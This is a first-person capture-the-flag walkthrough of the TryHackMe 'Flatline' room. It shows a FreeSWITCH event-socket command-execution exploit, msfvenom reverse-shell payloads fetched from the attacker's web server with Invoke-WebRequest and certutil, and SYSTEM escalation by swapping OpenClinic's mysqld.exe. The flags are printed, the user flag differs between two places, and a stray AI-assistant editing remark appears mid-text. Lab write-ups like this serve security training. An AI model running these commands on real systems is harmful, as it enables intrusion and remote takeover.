# <div align="center">[Flatline TryHackMe Walkthrough — Complete Step-by-Step Guide to Root](https://tryhackme.com/room/flatline)</div>
<

## Task 1 . Flags

### 1.1. What is the user.txt flag?
```
THM{64bca0843d535fa733eecdc59d27cbe26}
```
### 1.2. What is the user.txt flag?
```
THM{8c8bc5558f0f3f8060d00ca231a9fb5e}
```

## Initial Enumeration

As always, I kicked things off with an **Nmap scan** to enumerate the open services running on the target machine (`10.201.101.104`). I used the following command:

```bash
nmap -sV -sC -Pn 10.201.101.104
```

* `-sV` → Detects service versions
* `-sC` → Runs default Nmap scripts for additional info
* `-Pn` → Skips host discovery (treats host as online)

The scan revealed two interesting open ports:

```
3389/tcp open  ms-wbt-server    Microsoft Terminal Services
8021/tcp open  freeswitch-event FreeSWITCH mod_event_socket
```

* Port **3389 (RDP)** indicated that the machine was running Microsoft’s Remote Desktop Service.
* Port **8021 (FreeSWITCH mod\_event\_socket)** caught my attention, since FreeSWITCH is a VoIP service that has been known to contain vulnerabilities.

The domain name of the system was also disclosed as:

```
WIN-EOM4PK0578N
```

At this point, my main focus shifted toward the **FreeSWITCH service** to check if it was exploitable.

---

## Finding Vulnerabilities

I searched Exploit-DB using `searchsploit` to see if there were any publicly available exploits for FreeSWITCH:

```bash
searchsploit FreeSWITCH
```

The results looked promising:

```
-$ searchsploit Freeswitch
--------------------------------------------------------- ---------------------------
 Exploit Title                                           |  Path
--------------------------------------------------------- ---------------------------
FreeSWITCH - Event Socket Command Execution (Metasploit) | multiple/remote/47698.rb
FreeSWITCH 1.10.1 - Command Execution                    | windows/remote/47799.txt
--------------------------------------------------------- ---------------------------
```

The second one looked like a straightforward **remote code execution (RCE)** exploit, so I pulled the exploit file for review:

```bash
searchsploit -m windows/remote/47799.txt
cat 47799.txt
```

Inside, I found an example usage that confirmed command execution was possible via the FreeSWITCH event socket.

---

## Exploitation

I decided to test the exploit directly by executing a simple `whoami` command against the target:

```bash
python3 47799.txt 10.201.101.104 whoami
```

The exploit worked!

```
Authenticated
win-eom4pk0578n\nekrotic
```

That confirmed I had remote command execution on the machine as the **Nekrotic** user.

---

## Exploring the File System

With code execution in place, I explored the `C:\` drive to see the file structure:

```bash
python3 47799.txt 10.201.101.104 "dir C:\"
```

Output:

```
PerfLogs
Program Files
Program Files (x86)
projects
Users
Windows
```

Inside the **Users** directory, I found two accounts:

* Administrator
* Nekrotic

Naturally, I went straight for `Nekrotic\Desktop` to check for any flags.

```bash
python3 47799.txt 10.201.101.104 "dir C:\Users\Nekrotic\Desktop"
```

And there they were:

```
user.txt
root.txt
```
Perfect — now I’ll polish your **second part** into a **Medium-optimized walkthrough section** with a smooth flow, headings, SEO keywords, and explanations in first-person style.

---

## 📝 Capturing the User Flag

With remote code execution working, my next goal was to capture the **user flag**. I retried the command execution and this time I was able to successfully read the contents of `user.txt`:

```bash
python3 47799.txt 10.201.101.104 "type C:\\Users\\nekrotic\\Desktop\\user.txt"
```

Output:

```
Authenticated
Content-Type: api/response
Content-Length: 38

THM{64bca0843d535fa73eecdc59d27cbe26}
```

🎉 **User Flag:** `THM{64bca0843d535fa73eecdc59d27cbe26}`

At this stage, I had successfully retrieved the user flag, but attempts to access `root.txt` failed:

```bash
python3 47799.txt 10.201.101.104 "type C:\\Users\\nekrotic\\Desktop\\root.txt"
```

The exploit returned:

```
Authenticated
Content-Type: api/response
Content-Length: 14

-ERR no reply
```

Clearly, I needed a more **stable foothold** to interact with the system properly.

---

## 🎯 Establishing a Reverse Shell

Since direct flag extraction wasn’t reliable, I switched to a more stable approach — gaining a **reverse shell** using `msfvenom` and Metasploit’s handler.

First, I generated a Windows Meterpreter payload:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.17.30.120 LPORT=4444 -f exe > payload.exe
```

* `-p` → payload type
* `LHOST` → my attacker IP
* `LPORT` → port for reverse connection
* `-f exe` → output format as Windows executable

---

## 🚚 Delivering the Payload

To transfer the payload to the victim machine, I started a simple Python web server on my attack box:

```bash
python3 -m http.server 8000
```

Then, using the FreeSWITCH exploit, I downloaded the payload onto the victim’s Desktop:

```bash
python3 47799.txt 10.201.14.41 "powershell Invoke-WebRequest -URI http://10.17.30.120:8000/payload.exe -o C:\\Users\\Nekrotic\\Desktop\\payload.exe"
```

I confirmed the payload was successfully delivered:

```bash
python3 47799.txt 10.201.14.41 "dir C:\\Users\\Nekrotic\\Desktop"
```

Output:

```
payload.exe
root.txt
user.txt
```

---

## Gaining Access with Meterpreter

With the payload on the target, I set up a Metasploit handler to catch the reverse shell:

```bash
msfconsole -q
use multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 10.17.30.120
set LPORT 4444
run
```

Finally, I executed the payload on the victim machine:
```
python3 47799.txt 10.201.101.104 "C:\\Users\\Nekrotic\\Desktop\\payload.exe"
```
Boom! I got a Meterpreter session back, giving me a much more stable and interactive shell on the victim system.



##  Privilege Escalation via OpenClinic

While exploring the system further, I noticed an interesting directory inside `C:\projects\` named **openclinic**.

```bash
meterpreter > ls C:\projects\openclinic
```

The folder contained multiple executables and configuration files:

```
OpenClinic GA login.exe
OpenClinicStartServices.exe
configureCountry.bat
configureLanguage.bat
jdk1.8
lua5.1.dll
mariadb
tomcat8
uninstall.exe
```

Seeing **OpenClinic GA** immediately raised a red flag — this application has a history of security issues.

---

## 🔍 Identifying the Vulnerability

I ran `searchsploit` to check for known exploits:

```bash
searchsploit openclinic
```

The results included:

* **OpenClinic GA 5.194.18 – Local Privilege Escalation** (EDB-ID: 50448)
* **OpenClinic GA 5.247.01 – Information Disclosure**
* **OpenClinic GA 5.247.01 – Path Traversal (Authenticated)**

The local privilege escalation exploit (50448) stood out as exactly what I needed. Reading through the exploit details, the vulnerability worked like this:

> A low-privileged account can rename critical executables such as `mysqld.exe` or `tomcat8.exe` and replace them with a malicious payload. Since these services run with **Local System privileges**, the payload will execute as `NT AUTHORITY\SYSTEM` after a restart.

Perfect! This was my path to SYSTEM-level access.

---

## 💥 Exploitation Steps

1. **Generate a Malicious Executable**
   I created a reverse shell payload with `msfvenom` and named it `mysql.exe`:

   ```bash
   msfvenom -p windows/shell_reverse_tcp LHOST=10.17.30.120 LPORT=8900 -f exe > mysql.exe
   ```

2. **Start a Listener**
   On my attack machine, I set up a netcat listener to catch the shell:

   ```bash
   nc -lnvp 8900
   ```

3. **Host the Payload**
   I hosted the payload with a Python web server:

   ```bash
   python3 -m http.server 8000
   ```

4. **Rename the Original Binary**
   Using the Meterpreter Powershell extension, I navigated to the MariaDB `bin` directory and renamed the original `mysqld.exe`:

   ```powershell
   PS > cd C:\projects\openclinic\mariadb\bin
   PS > Move-Item mysqld.exe mysqld.bak
   ```

5. **Download the Malicious Payload**
   I used `certutil.exe` to pull down the malicious executable and save it as `mysqld.exe`:

   ```powershell
   PS > certutil.exe -urlcache -split -f http://10.17.30.120:8000/mysql.exe mysqld.exe
   ```

   ****The payload was successfully transferred.

6. **Trigger Execution via Restart**
   Since the service was tied to system startup, I forced a reboot:

   ```powershell
   PS > Restart-Computer
   ```

   After the restart, the malicious `mysqld.exe` was executed with **SYSTEM privileges**, and my netcat listener received a shell:

   ```bash
   connect to [10.17.30.120] from (UNKNOWN) [10.201.101.104] 49670
   Microsoft Windows [Version 10.0.17763.737]
   C:\Windows\system32>
   ```

I had successfully escalated to **NT AUTHORITY\SYSTEM**!

## Capturing the Root Flag

With full SYSTEM access, retrieving the root flag was straightforward.

```bash
C:\Windows\system32> type "C:\Users\Nekrotic\Desktop\root.txt"
```

Output:

```
THM{8c8bc5558f0f3f8060d00ca231a9fb5e}
```
